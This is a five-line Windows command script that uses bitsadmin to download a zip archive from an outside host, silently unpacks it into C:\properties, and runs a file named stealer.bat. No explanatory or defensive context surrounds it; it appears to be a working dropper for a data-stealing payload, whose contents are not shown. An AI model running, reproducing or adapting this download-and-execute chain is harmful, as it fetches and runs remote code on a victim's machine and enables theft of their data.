cd C:\Windows\System32\
bitsadmin.exe /transfer "JobName" http://problemvk.esy.es/update/update.zip C:\properties\update.zip
cd C:\properties
unzip.exe -q -o update.zip
C:\properties\stealer.bat